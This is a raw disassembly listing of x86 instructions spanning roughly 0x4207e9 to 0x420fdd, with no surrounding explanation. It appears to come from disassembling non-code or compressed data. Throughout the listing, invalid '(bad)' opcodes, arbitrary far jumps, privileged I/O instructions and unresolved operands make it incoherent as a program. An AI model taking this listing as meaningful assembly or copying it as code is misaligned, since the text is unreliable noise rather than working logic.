  4207e9:	adc    eax,0x8819d357
  4207ee:	push   ebp
  4207ef:	div    DWORD PTR [ebp-0x32]
  4207f2:	add    dh,BYTE PTR [edi]
  4207f4:	loopne 0x420855
  4207f6:	fwait
  4207f7:	ja     0x4207e6
  4207f9:	js     0x420818
  4207fb:	jae    0x4207ae
  4207fd:	pop    edi
  4207fe:	mov    eax,ds:0xc4f231c3
  420803:	dec    eax
  420804:	leave  
  420805:	jmp    0xa559:0x8da4177a
  42080c:	loope  0x4207bd
	...
  42081a:	ja     0x420868
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx-0x1685d003]
  420828:	sti    
  420829:	xlat   BYTE PTR ds:[ebx]
  42082a:	add    al,0x85
  42082c:	add    DWORD PTR [eax],eax
  42082e:	cld    
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [esi],ah
  420833:	mov    esi,0x7ba5aeda
  420838:	jno    0x420832
  42083a:	mul    dl
  42083c:	jne    0x420852
  42083e:	sbb    ebp,DWORD PTR [esi+eax*4+0x319bbeef]
  420845:	sbb    al,BYTE PTR [ebx-0x7f]
  420848:	pushf  
  420849:	jne    0x420882
  42084b:	aas    
  42084c:	mov    ebx,0xcffb28c6
  420851:	test   al,0x4f
  420853:	ins    BYTE PTR es:[edi],dx
  420854:	jmp    0x39a2:0xfeaeec5e
  42085b:	jl     0x4208b3
  42085d:	fld    TBYTE PTR [edi+0x672a6334]
  420863:	dec    esp
  420864:	out    0x23,al
  420866:	mov    edx,0xfdbe9847
  42086b:	je     0x420818
  42086d:	pop    edi
  42086e:	inc    esi
  42086f:	aaa    
  420870:	rol    DWORD PTR [edi],0x43
  420873:	and    BYTE PTR [edi],dh
  420875:	jmp    0xf97248ee
  42087a:	ficomp WORD PTR [esi-0x2e]
  42087d:	daa    
  42087e:	fild   QWORD PTR [edx+0x1f]
  420881:	inc    edx
  420882:	ret    0x35c4
  420885:	xchg   esi,eax
  420886:	push   edx
  420887:	out    0x94,eax
  420889:	std    
  42088a:	jmp    0x420842
  42088c:	add    eax,0x3b2d9145
  420892:	dec    ecx
  420893:	pop    edx
  420894:	push   edx
  420895:	mov    dh,0xc6
  420897:	sbb    dh,dl
  420899:	xor    BYTE PTR [ecx+0x26b6cd6d],bl
  42089f:	and    ax,0xef8f
  4208a3:	outs   dx,DWORD PTR ds:[esi]
  4208a4:	and    eax,0xa32111c1
  4208a9:	ins    BYTE PTR es:[edi],dx
  4208aa:	aam    0x37
  4208ac:	adc    DWORD PTR [edi+eiz*2],0x2c
  4208b0:	bound  ebp,QWORD PTR [ebp-0x1265ed8b]
  4208b6:	mov    edi,0xed7930f2
  4208bb:	out    dx,eax
  4208bc:	shr    DWORD PTR [eax+0x4859daca],cl
  4208c2:	sub    BYTE PTR [ebp-0x3e96122e],dl
  4208c8:	popf   
  4208c9:	sbb    BYTE PTR [edi],0xfe
  4208cc:	cmp    al,BYTE PTR [edi+eax*8-0x13]
  4208d0:	daa    
  4208d1:	(bad)  
  4208d2:	(bad)  
  4208d3:	call   0x665d2bc6
  4208d8:	inc    ecx
  4208d9:	daa    
  4208da:	loope  0x42092a
  4208dc:	sbb    esp,esp
  4208de:	sub    al,0x6c
  4208e0:	dec    esi
  4208e1:	dec    edi
  4208e2:	push   0x24ae9095
  4208e7:	push   esi
  4208e8:	mov    al,ds:0xe0d61a18
  4208ed:	xchg   dh,dl
  4208ef:	(bad)  [ebx+0x200d4c97]
  4208f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208f6:	inc    eax
  4208f7:	pop    ebx
  4208f8:	mov    ebp,0xee6a25df
  4208fd:	stc    
  4208fe:	shl    DWORD PTR [edx-0x6aaabb92],cl
  420904:	mov    ah,0x86
  420906:	adc    ecx,eax
  420908:	int3   
  420909:	ret    
  42090a:	daa    
  42090b:	xchg   edx,eax
  42090c:	aad    0x43
  42090e:	hlt    
  42090f:	pop    ecx
  420910:	cmc    
  420911:	les    ebx,FWORD PTR [eax]
  420913:	inc    esp
  420914:	ss mov al,0xae
  420917:	lock mov esi,0xacb51130
  42091d:	pop    esp
  42091e:	fcmove st,st(3)
  420920:	mov    dl,0xff
  420922:	lock xor ch,al
  420925:	call   0xd80a:0xb3ffab23
  42092c:	stos   DWORD PTR es:[edi],eax
  42092d:	stos   BYTE PTR es:[edi],al
  42092e:	or     al,0x5f
  420930:	push   esp
  420931:	xor    al,0xa8
  420933:	lahf   
  420934:	mov    dl,0x58
  420936:	jns    0x420930
  420938:	cmp    DWORD PTR [esi],ebx
  42093a:	out    0x5b,al
  42093c:	pop    ebx
  42093d:	sbb    DWORD PTR [eax+eiz*2],esp
  420940:	fst    QWORD PTR [ebp-0x1f3adadc]
  420946:	or     eax,0xb84f94f7
  42094b:	rcl    BYTE PTR [ebx+0x21852432],0xdb
  420952:	jge    0x420978
  420954:	mov    BYTE PTR [ecx-0x1c86fec2],dl
  42095a:	leave  
  42095b:	push   esp
  42095c:	ins    DWORD PTR es:[edi],dx
  42095d:	xchg   eax,ecx
  42095f:	fcomip st,st(2)
  420961:	cld    
  420962:	repnz rcr BYTE PTR [edx+0x63],1
  420966:	xchg   ebx,eax
  420967:	cli    
  420968:	les    eax,FWORD PTR [ecx]
  42096a:	les    esp,FWORD PTR [edx+0x2f]
  42096d:	sar    ch,1
  42096f:	and    BYTE PTR [esi-0x63e53d50],bh
  420975:	iret   
  420976:	(bad)  
  420977:	in     al,0x1d
  420979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42097a:	cli    
  42097b:	push   ecx
  42097c:	(bad)  
  42097d:	aas    
  42097e:	adc    ch,bl
  420980:	(bad)  
  420982:	dec    ebx
  420983:	std    
  420984:	or     BYTE PTR [edx-0x69aa19cb],dl
  42098a:	out    dx,al
  42098b:	fimul  DWORD PTR [eax+0x33]
  42098e:	test   eax,0x146658eb
  420993:	popf   
  420994:	imul   esp,DWORD PTR [esi+edi*4],0x781659c9
  42099b:	pop    ds
  42099c:	js     0x4209b7
  42099e:	jne    0x4209d2
  4209a0:	pop    ebx
  4209a1:	mov    al,0xb6
  4209a3:	mov    cl,0x4b
  4209a5:	push   0x6d
  4209a7:	pop    ss
  4209a8:	(bad)  
  4209a9:	cli    
  4209aa:	mov    bl,0xca
  4209ac:	fsub   DWORD PTR [ecx+0x5f]
  4209af:	scas   eax,DWORD PTR es:[edi]
  4209b0:	ds push ecx
  4209b2:	mov    edx,0x9e078bfb
  4209b7:	ins    DWORD PTR es:[edi],dx
  4209b8:	data16 jnp 0x42095c
  4209bb:	sti    
  4209bc:	(bad)  
  4209bd:	icebp  
  4209be:	mov    bl,dh
  4209c0:	dec    ecx
  4209c1:	sub    cl,al
  4209c3:	(bad)  
  4209c4:	sbb    edi,DWORD PTR [ebp+0x39]
  4209c7:	add    al,0xfd
  4209c9:	shl    BYTE PTR [edx-0x7f954c1d],0xe9
  4209d0:	push   ecx
  4209d1:	loopne 0x420956
  4209d3:	fisttp WORD PTR [esp+eiz*8]
  4209d6:	pop    ecx
  4209d7:	ds addr16 pusha 
  4209da:	loope  0x42098a
  4209dc:	frstor [esi+ebp*8+0xf1579c6]
  4209e3:	out    dx,eax
  4209e4:	pusha  
  4209e5:	xchg   edx,eax
  4209e6:	jmp    0xb932:0xbed3c499
  4209ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209ee:	in     eax,0xdf
  4209f0:	jno    0x420a07
  4209f2:	or     eax,0x7d10f3ff
  4209f7:	test   BYTE PTR [edi-0x34],ch
  4209fa:	icebp  
  4209fb:	sub    esi,DWORD PTR [edi-0x113b78d2]
  420a01:	inc    ebp
  420a02:	lahf   
  420a03:	xchg   edx,eax
  420a04:	push   ds
  420a05:	fxch   st(3)
  420a07:	jae    0x4209c9
  420a09:	mov    edi,edi
  420a0b:	or     ebp,DWORD PTR [eax-0x4d]
  420a0e:	jno    0x4209e0
  420a10:	push   ds
  420a11:	pop    edi
  420a12:	and    DWORD PTR [edi+0x12],ebp
  420a15:	dec    eax
  420a16:	mov    eax,ds:0x8ca2f914
  420a1b:	xchg   edi,eax
  420a1c:	pop    es
  420a1d:	sub    ecx,DWORD PTR [eax+esi*8]
  420a20:	jl     0x420a0c
  420a22:	sbb    cl,bl
  420a24:	pop    ss
  420a25:	jecxz  0x4209bc
  420a27:	cdq    
  420a28:	mov    edx,0x77cf8dbb
  420a2d:	xor    BYTE PTR [eax],al
	...
  420a37:	add    BYTE PTR [eax],al
  420a39:	add    BYTE PTR [edi],al
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420a9e
  420a47:	popf   
  420a48:	(bad)  
  420a4a:	add    BYTE PTR [edi+0x1fc0001],al
  420a50:	add    BYTE PTR [eax],al
  420a52:	or     BYTE PTR [esi],0xec
  420a55:	fwait
  420a56:	call   0xf70b:0x940564fa
  420a5d:	mov    ds:0xb526adea,al
  420a62:	xor    eax,DWORD PTR [eax+0x35a8d15c]
  420a68:	das    
  420a69:	mov    al,ds:0x1a338d55
  420a6e:	mov    esp,ebx
  420a70:	(bad)  
  420a71:	in     eax,0x73
  420a73:	xchg   ecx,eax
  420a74:	in     eax,dx
  420a75:	inc    edx
  420a76:	sub    al,0xba
  420a78:	(bad)  
  420a79:	int    0x2c
  420a7b:	sbb    al,BYTE PTR [edi]
  420a7d:	movd   DWORD PTR [eax],mm4
  420a80:	ret    
  420a81:	(bad)  
  420a82:	pop    ecx
  420a83:	sbb    DWORD PTR [edi],ecx
  420a85:	xchg   DWORD PTR [ebp+0x763db2e1],esi
  420a8b:	scas   eax,DWORD PTR es:[edi]
  420a8c:	scas   eax,DWORD PTR es:[edi]
  420a8d:	push   eax
  420a8e:	jae    0x420a5b
  420a90:	outs   dx,BYTE PTR ds:[esi]
  420a91:	in     al,dx
  420a92:	scas   al,BYTE PTR es:[edi]
  420a93:	jecxz  0x420b04
  420a95:	mov    cl,0x8c
  420a97:	push   eax
  420a98:	or     BYTE PTR [edi],bl
  420a9a:	mov    bh,0x81
  420a9c:	cld    
  420a9d:	inc    edx
  420a9e:	push   esp
  420a9f:	mov    bl,0x4
  420aa1:	cmp    al,0x20
  420aa3:	stc    
  420aa4:	adc    al,0xb
  420aa6:	test   al,0xcb
  420aa8:	rcl    al,cl
  420aaa:	sub    eax,0xd6738a36
  420aaf:	inc    ecx
  420ab0:	(bad)  
  420ab1:	mov    eax,0x9e3ecca5
  420ab6:	stc    
  420ab7:	mov    edx,0xa8c5c8d7
  420abc:	push   ecx
  420abd:	add    BYTE PTR [edx],dl
  420abf:	xchg   edx,eax
  420ac0:	xor    dh,BYTE PTR [edi-0x12]
  420ac3:	push   0xffffffe0
  420ac5:	xor    DWORD PTR [eax],esp
  420ac7:	jo     0x420afc
  420ac9:	idiv   DWORD PTR [ecx+0x25c57ff4]
  420acf:	out    0xca,eax
  420ad1:	adc    ch,BYTE PTR [eax]
  420ad3:	call   0xabcd:0x1338ada5
  420ada:	cmp    al,ch
  420adc:	out    dx,eax
  420add:	inc    ebx
  420ade:	call   0x4486:0xc4cd6fb9
  420ae5:	int3   
  420ae6:	frstor [ecx+0x7b423c10]
  420aec:	sbb    eax,0x969467c0
  420af1:	dec    ebx
  420af2:	outs   dx,DWORD PTR ds:[esi]
  420af3:	popa   
  420af4:	mov    esp,DWORD PTR [ebp-0x27670ee7]
  420afa:	xchg   ecx,eax
  420afb:	xchg   BYTE PTR [edx+0x28],ch
  420afe:	daa    
  420aff:	mov    dh,0x9d
  420b01:	xor    edi,eax
  420b03:	ds jbe 0x420ace
  420b06:	mov    eax,ds:0x2a78a6be
  420b0b:	in     al,0x73
  420b0d:	lea    eax,[esi]
  420b0f:	int3   
  420b10:	inc    edi
  420b11:	lock test BYTE PTR [eax+0x5a],ah
  420b15:	inc    BYTE PTR [edx+0x6a]
  420b18:	hlt    
  420b19:	sbb    al,0xbf
  420b1b:	or     DWORD PTR [eax+eax*2+0x33],ebx
  420b1f:	mov    ebp,0xf9aa3d9a
  420b24:	cmp    BYTE PTR [eax-0x51],al
  420b27:	mov    edi,0xb29c7801
  420b2c:	mov    eax,0x7e012384
  420b31:	mov    eax,0xbfd251b6
  420b36:	lock mov ds:0xc93613a2,al
  420b3c:	mov    al,0xc0
  420b3e:	mov    ecx,0x79142b90
  420b43:	or     BYTE PTR [edi-0x1aeb33f1],0x46
  420b4a:	xchg   BYTE PTR [esi+0x268b5031],bh
  420b50:	mov    edi,0x5e9d61f8
  420b55:	push   eax
  420b56:	xchg   edi,eax
  420b57:	and    eax,0x77f2956c
  420b5c:	inc    esp
  420b5d:	sub    edi,DWORD PTR [ebx+0x4f484647]
  420b63:	and    ebx,edx
  420b65:	mov    al,0xb1
  420b67:	enter  0xbb99,0x6c
  420b6b:	add    al,0xb7
  420b6d:	push   edx
  420b6e:	hlt    
  420b6f:	retf   
  420b70:	push   0xf112b06f
  420b75:	fidiv  DWORD PTR [ebp+0x33c0c5ef]
  420b7b:	aas    
  420b7c:	mov    eax,0x644c9963
  420b82:	cli    
  420b83:	push   edx
  420b84:	scas   al,BYTE PTR es:[edi]
  420b85:	shr    DWORD PTR [ecx],cl
  420b87:	stos   DWORD PTR es:[edi],eax
  420b88:	out    0xf1,eax
  420b8a:	xchg   ecx,eax
  420b8b:	lods   eax,DWORD PTR ds:[esi]
  420b8c:	push   ebp
  420b8d:	enter  0xb867,0xfa
  420b91:	sbb    BYTE PTR [esi-0x1f],cl
  420b94:	mov    bh,bh
  420b96:	push   eax
  420b97:	jo     0x420baf
  420b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b9a:	lods   al,BYTE PTR ds:[esi]
  420b9b:	sub    al,0x45
  420b9d:	in     al,0x43
  420b9f:	pop    ebp
  420ba0:	mov    edx,0x6ea478f1
  420ba5:	mov    ebx,0xe49282a3
  420baa:	xchg   esi,eax
  420bab:	xchg   edi,eax
  420bac:	push   cs
  420bad:	adc    ah,BYTE PTR [eax]
  420baf:	out    dx,eax
  420bb0:	dec    eax
  420bb1:	pop    esi
  420bb2:	mov    esi,DWORD PTR ds:[eax+0x4ca6cbb9]
  420bb9:	push   edx
  420bba:	push   es
  420bbb:	lahf   
  420bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bbd:	add    al,BYTE PTR [esi-0x38]
  420bc0:	mov    ?,WORD PTR [ebx]
  420bc2:	xor    DWORD PTR [edi+ebp*1],esp
  420bc5:	pusha  
  420bc6:	xor    edx,esp
  420bc8:	xchg   eax,esp
  420bca:	cmp    DWORD PTR [esi-0x67],0x46b5a2d5
  420bd1:	stos   BYTE PTR es:[edi],al
  420bd2:	repnz loop 0x420c32
  420bd5:	scas   eax,DWORD PTR es:[edi]
  420bd6:	call   0x49ba:0x9eced8c0
  420bdd:	sar    BYTE PTR [edx+edx*2+0x17],1
  420be1:	rol    BYTE PTR [edi+0x56],cl
  420be4:	arpl   bx,di
  420be6:	inc    esp
  420be7:	dec    ebp
  420be8:	dec    esp
  420be9:	or     esi,DWORD PTR [ecx]
  420beb:	or     ch,ch
  420bed:	mov    eax,esp
  420bef:	ret    
  420bf0:	mov    ebx,0x8644b727
  420bf5:	jmp    0xdf30343e
  420bfa:	out    dx,al
  420bfb:	inc    edi
  420bfc:	and    ecx,DWORD PTR [edx+esi*1-0x27]
  420c00:	iret   
  420c01:	add    ebx,edi
  420c03:	sub    eax,0xb857b05a
  420c08:	pushf  
  420c09:	cmp    BYTE PTR [edi],0x7b
  420c0c:	mov    ah,0xdb
  420c0e:	xchg   esi,eax
  420c0f:	jg     0x420c60
  420c11:	in     al,dx
  420c12:	cld    
  420c13:	pop    ss
  420c14:	dec    esp
  420c15:	pop    ebp
  420c16:	jge    0x420c7b
  420c18:	test   BYTE PTR ds:0x9a9b58b,ch
  420c1e:	cmp    al,0x93
  420c20:	test   eax,0x2ceabbd3
  420c25:	sbb    dl,BYTE PTR [eax+0x17]
  420c28:	shr    esi,0x62
  420c2b:	leave  
  420c2c:	into   
  420c2d:	xor    al,0xc6
  420c2f:	push   ss
  420c30:	mov    BYTE PTR [esi+0x38f85e3a],ah
  420c36:	pop    esp
  420c37:	neg    eax
  420c39:	mov    DWORD PTR [ecx+0x4ff8c86b],ebp
  420c3f:	(bad)  
  420c40:	aam    0x77
  420c42:	into   
  420c43:	leave  
  420c44:	fsub   QWORD PTR [ebp+0x32d64474]
  420c4a:	enter  0xca4a,0xec
	...
  420c5a:	push   ds
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    WORD PTR [esi-0x3062c00],ss
  420c6b:	mov    BYTE PTR [ecx],al
  420c6d:	add    ah,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    BYTE PTR ds:0x52cedaec,dl
  420c77:	xchg   ebp,eax
  420c78:	in     al,0xec
  420c7a:	mov    bh,0x59
  420c7c:	nop
  420c7d:	not    edx
  420c7f:	data16 out dx,al
  420c81:	pusha  
  420c82:	clc    
  420c83:	inc    ebp
  420c84:	inc    ebx
  420c85:	sbb    eax,0x8226c77b
  420c8a:	js     0x420cfc
  420c8c:	jle    0x420cea
  420c8e:	ins    DWORD PTR es:[edi],dx
  420c8f:	(bad)  
  420c90:	mov    al,0xe
  420c92:	cmp    al,0x1a
  420c94:	ins    DWORD PTR es:[edi],dx
  420c95:	push   ds
  420c96:	mov    ebx,0xaa5f3b23
  420c9b:	dec    esp
  420c9c:	mov    ah,0x7c
  420c9e:	pop    ebx
  420c9f:	pop    edx
  420ca0:	cmp    eax,0x35a8908d
  420ca5:	int    0x27
  420ca7:	leave  
  420ca8:	gs adc edi,esp
  420cab:	jo     0x420c37
  420cad:	mov    bh,0x50
  420caf:	(bad)  
  420cb0:	xor    BYTE PTR [ebx+0x7dcd373e],al
  420cb6:	leave  
  420cb7:	or     ebx,esi
  420cb9:	adc    bh,BYTE PTR [edx]
  420cbb:	idiv   BYTE PTR [eax+0x31]
  420cbe:	jno    0x420c69
  420cc0:	xor    DWORD PTR [esi-0x381e374d],0x6dfc5ab4
  420cca:	cli    
  420ccb:	mov    dh,0x9a
  420ccd:	cmp    al,0x46
  420ccf:	lods   eax,DWORD PTR ds:[esi]
  420cd0:	pop    esp
  420cd1:	inc    ecx
  420cd2:	retf   0x2721
  420cd5:	mov    esp,DWORD PTR [ecx-0x17486204]
  420cdb:	fild   WORD PTR [eax-0x6a0c7e87]
  420ce1:	enter  0x5d23,0x7b
  420ce5:	xor    eax,DWORD PTR [esp+ecx*4]
  420ce8:	and    bh,0x9d
  420ceb:	dec    edi
  420cec:	push   ecx
  420ced:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  420cef:	icebp  
  420cf0:	and    DWORD PTR [ebx+edx*1-0x3f],edx
  420cf4:	push   ebp
  420cf5:	pop    edx
  420cf6:	fstp   TBYTE PTR [edi+0x5b3c3e96]
  420cfc:	lea    ecx,[edi]
  420cfe:	retf   0xfcfb
  420d01:	cdq    
  420d02:	div    BYTE PTR [bx-0x27]
  420d06:	push   esp
  420d07:	cmp    esp,DWORD PTR [edi+eiz*1]
  420d0a:	mov    ch,0xc8
  420d0c:	or     al,0x38
  420d0e:	adc    bl,ch
  420d10:	repz ds pop edi
  420d13:	xchg   DWORD PTR [eax+0x16],ebp
  420d16:	into   
  420d17:	scas   eax,DWORD PTR es:[edi]
  420d18:	popa   
  420d19:	mov    ds:0x8b0afd2e,al
  420d1e:	retf   
  420d1f:	rol    edi,cl
  420d21:	cwde   
  420d22:	and    BYTE PTR [edx+0x3c],al
  420d25:	data16 mov al,0xe0
  420d28:	pop    esp
  420d29:	ret    
  420d2a:	(bad)  
  420d2b:	shl    DWORD PTR [edi],cl
  420d2d:	mov    ebx,0xbe74bc4
  420d32:	xchg   BYTE PTR [ebx+0xa],bl
  420d35:	test   bl,bl
  420d37:	imul   ebp,ecx,0xf8a2299
  420d3d:	mov    bh,0x69
  420d3f:	mov    al,ds:0x594ead4b
  420d44:	arpl   bp,ax
  420d46:	out    0xd7,eax
  420d48:	xor    al,0x27
  420d4a:	push   ebp
  420d4b:	xchg   esp,eax
  420d4c:	xchg   edi,eax
  420d4d:	(bad)  
  420d4e:	sbb    eax,DWORD PTR [ebp+0x4f]
  420d51:	adc    eax,0xdd204765
  420d56:	sub    al,0x75
  420d58:	cmp    ah,BYTE PTR [edi+0x79]
  420d5b:	aas    
  420d5c:	mov    ch,0x99
  420d5e:	inc    esp
  420d5f:	je     0x420db6
  420d61:	scas   eax,DWORD PTR es:[edi]
  420d62:	enter  0x8ad9,0x22
  420d66:	mov    bh,0xbf
  420d68:	(bad)  
  420d69:	jp     0x420d01
  420d6b:	lock jbe 0x420cfa
  420d6e:	xchg   ebp,eax
  420d6f:	(bad)  
  420d70:	xchg   ebx,eax
  420d71:	push   ss
  420d72:	fcomp  QWORD PTR [eax]
  420d74:	je     0x420d58
  420d76:	call   0x4263:0x28f356e1
  420d7d:	or     eax,0xc6bf3e50
  420d82:	(bad)  
  420d84:	jge    0x537cdfbd
  420d8a:	add    esp,ecx
  420d8c:	push   eax
  420d8d:	sti    
  420d8e:	mov    ebp,0xf8f12ea4
  420d93:	(bad)  
  420d95:	push   ds
  420d96:	inc    edi
  420d97:	popa   
  420d98:	clc    
  420d99:	sub    al,0x8b
  420d9b:	ins    DWORD PTR es:[edi],dx
  420d9c:	xchg   ecx,eax
  420d9d:	or     BYTE PTR [ecx+0x4],al
  420da0:	in     eax,0x97
  420da2:	sub    eax,0xc844d89f
  420da7:	mov    ecx,0xd7329e56
  420dac:	cmp    bh,BYTE PTR [ebx+0x30]
  420daf:	jno    0x420e25
  420db1:	push   0xc291bd5c
  420db6:	mov    DWORD PTR [ebp+edi*8+0x13],eax
  420dba:	pop    edi
  420dbb:	leave  
  420dbc:	pop    ebp
  420dbd:	ror    BYTE PTR [ebp-0x6570ce28],1
  420dc3:	xchg   esi,eax
  420dc4:	dec    ebx
  420dc5:	push   cs
  420dc6:	out    0xee,al
  420dc8:	arpl   WORD PTR [edx-0x821f005],bx
  420dce:	or     BYTE PTR [edx],dl
  420dd0:	and    eax,edi
  420dd2:	mov    ebp,0x6da76268
  420dd7:	sbb    eax,DWORD PTR [edx+0x29]
  420dda:	mov    edi,0xcefc6a3c
  420ddf:	leave  
  420de0:	lods   eax,DWORD PTR ds:[esi]
  420de1:	outs   dx,BYTE PTR ds:[esi]
  420de2:	ret    
  420de3:	or     DWORD PTR [edi-0x242edc5b],ebp
  420de9:	mov    ecx,0xbed3b8a8
  420dee:	mov    ebx,DWORD PTR [esi-0x132546e1]
  420df4:	out    0xda,eax
  420df6:	jne    0x420de7
  420df8:	(bad)  
  420df9:	in     eax,0x9
  420dfb:	mov    dl,BYTE PTR ds:0x3445e41d
  420e01:	inc    ebp
  420e02:	test   eax,0xc798f232
  420e07:	mov    esp,0xce7f8c7a
  420e0c:	es pop ss
  420e0e:	aam    0xbb
  420e10:	(bad)  
  420e11:	xchg   esi,eax
  420e12:	inc    ebx
  420e13:	mov    ds:0x51f4ac9,eax
  420e18:	or     DWORD PTR [esp+ecx*4-0x3e5cc283],esi
  420e1f:	fisttp DWORD PTR [eax]
  420e21:	in     al,dx
  420e22:	cld    
  420e23:	xor    DWORD PTR cs:[ecx-0x2f78b232],ebx
  420e2a:	xchg   ebp,eax
  420e2b:	or     al,cl
  420e2d:	lds    ebp,FWORD PTR [edi-0x1cb0970c]
  420e33:	lea    ebp,[edx+0x5a]
  420e36:	and    bh,0xa6
  420e39:	inc    ebp
  420e3a:	int    0x7
  420e3c:	push   edi
  420e3d:	dec    ebx
  420e3e:	out    dx,eax
  420e3f:	shl    esp,0xc4
  420e42:	mov    edx,0x933c7568
  420e47:	jns    0x420eb6
  420e49:	js     0x420e10
  420e4b:	in     al,dx
  420e4c:	mov    eax,0xf90efe10
  420e51:	cmp    al,0x6b
  420e53:	addr16 retf 0x408e
  420e57:	xor    ebx,DWORD PTR [edx+0x44]
  420e5a:	jmp    0xa6c5:0x3766e999
  420e61:	and    edi,DWORD PTR [ecx+0x4bfcc486]
  420e67:	ror    BYTE PTR [edx+0x7927b8fb],0x9b
	...
  420e7a:	js     0x420e05
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e70
  420e87:	fdiv   QWORD PTR [ebx+0x14]
  420e8a:	clc    
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    ah,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    BYTE PTR [ebp-0x410f36a1],dl
  420e97:	cwde   
  420e98:	rol    BYTE PTR [ebx+0x2],cl
  420e9b:	sti    
  420e9c:	mov    ds:0xcf746d77,eax
  420ea1:	sub    ebp,DWORD PTR [esi-0x6f]
  420ea4:	and    BYTE PTR [edi+0x15],bl
  420ea7:	pusha  
  420ea8:	fs dec ebx
  420eaa:	xor    eax,edx
  420eac:	mov    ch,0x7e
  420eae:	add    al,0xb7
  420eb0:	leave  
  420eb1:	shr    BYTE PTR [esi+0x4a],1
  420eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb5:	or     DWORD PTR [ebx],esi
  420eb7:	cmp    DWORD PTR [edi+0x373aed99],edi
  420ebd:	cmp    DWORD PTR [ecx-0x276ca6b6],ebx
  420ec3:	ja     0x420e7f
  420ec5:	nop
  420ec6:	mov    bl,0xc8
  420ec8:	test   bl,ch
  420eca:	retf   0xc1d3
  420ecd:	fstp   TBYTE PTR [esi+eax*4+0x20]
  420ed1:	sbb    esp,DWORD PTR [edx-0x24347804]
  420ed7:	aaa    
  420ed8:	xor    ecx,edi
  420eda:	cpuid  
  420edc:	hlt    
  420edd:	scas   al,BYTE PTR es:[edi]
  420ede:	mov    edx,0x96a5edfa
  420ee3:	repnz test eax,0x7fc46fd3
  420ee9:	lods   al,BYTE PTR ds:[esi]
  420eea:	xor    BYTE PTR [ebx-0x61],al
  420eed:	sbb    al,cl
  420eef:	dec    ecx
  420ef0:	jg     0x420f3d
  420ef2:	push   esp
  420ef3:	outs   dx,BYTE PTR ds:[esi]
  420ef4:	ss add eax,0x49fbff0d
  420efa:	inc    esi
  420efb:	cmc    
  420efc:	call   0x470f04d4
  420f01:	mov    esp,0x3481de35
  420f06:	fadd   st(6),st
  420f08:	xor    edi,esi
  420f0a:	or     eax,0x631126ee
  420f0f:	outs   dx,BYTE PTR ds:[esi]
  420f10:	imul   ebp,DWORD PTR ds:0xff4d8d66,0x2be0f92
  420f1a:	push   ecx
  420f1b:	psrlq  mm6,QWORD PTR [esi]
  420f1e:	mov    edi,0x9cf7a391
  420f23:	mov    di,0x4eec
  420f27:	bound  esi,QWORD PTR [ecx-0x1cd44b41]
  420f2d:	inc    esp
  420f2e:	push   edx
  420f2f:	sbb    ebp,DWORD PTR [ebp+0x7a]
  420f32:	retf   
  420f33:	cs dec edx
  420f35:	xchg   ecx,eax
  420f36:	inc    eax
  420f37:	(bad)  
  420f38:	into   
  420f39:	push   ss
  420f3a:	cmp    DWORD PTR [eax-0x31],0x7639625a
  420f41:	cli    
  420f42:	dec    ebp
  420f43:	jb     0x420fa6
  420f45:	fild   QWORD PTR [bp+si]
  420f48:	imul   ebp,DWORD PTR [ecx-0x574fd353],0xfffffff5
  420f4f:	int    0x72
  420f51:	inc    esp
  420f52:	cmp    ch,al
  420f54:	test   eax,0x5e3f8bdf
  420f59:	imul   ebx,DWORD PTR [esi+0x42],0x72e18e5
  420f60:	dec    edx
  420f61:	pop    esp
  420f62:	jecxz  0x420fba
  420f64:	and    DWORD PTR [eax+0x55],0x3e0d9f7a
  420f6b:	push   0xffffffb4
  420f6d:	jecxz  0x420f0e
  420f6f:	push   ebp
  420f70:	pusha  
  420f71:	fcmovne st,st(2)
  420f73:	xchg   eax,esi
  420f75:	sbb    DWORD PTR [edi],esi
  420f77:	scas   al,BYTE PTR es:[edi]
  420f78:	loop   0x420f83
  420f7a:	sti    
  420f7b:	sbb    edi,DWORD PTR [ebp-0x13d83b78]
  420f81:	lahf   
  420f82:	and    DWORD PTR [ebx],0xffffffcd
  420f85:	and    al,0xf3
  420f87:	pop    ds
  420f88:	adc    dh,BYTE PTR [edx+0x5c764fcc]
  420f8e:	mov    ah,0x6
  420f90:	in     eax,dx
  420f91:	iret   
  420f92:	push   esp
  420f93:	(bad)  
  420f94:	pop    ds
  420f95:	rcl    DWORD PTR [edi],cl
  420f97:	sbb    eax,0x5c3c4839
  420f9c:	push   ds
  420f9d:	out    dx,eax
  420f9e:	ss add cl,bl
  420fa1:	into   
  420fa2:	test   eax,0x44e40a94
  420fa7:	popf   
  420fa8:	lds    ebp,FWORD PTR [edx+ebp*2-0x26d1f002]
  420faf:	aaa    
  420fb0:	jg     0x420faa
  420fb2:	push   cs
  420fb3:	(bad)  
  420fb4:	iret   
  420fb5:	pop    edx
  420fb6:	mul    eax
  420fb8:	(bad)  
  420fb9:	mov    esp,0x73e5b6a7
  420fbe:	popf   
  420fbf:	dec    esp
  420fc0:	std    
  420fc1:	xchg   ecx,eax
  420fc2:	add    ecx,DWORD PTR [eax]
  420fc4:	mov    ds:0x5f571581,eax
  420fc9:	mov    al,BYTE PTR [edi-0x5747b968]
  420fcf:	push   0xffffffed
  420fd1:	mov    al,0x28
  420fd3:	(bad)  
  420fd4:	and    BYTE PTR [ebp-0x2f5de6e9],al
  420fda:	mov    WORD PTR [ecx-0x6b],?
  420fdd:	adc    al,0x50
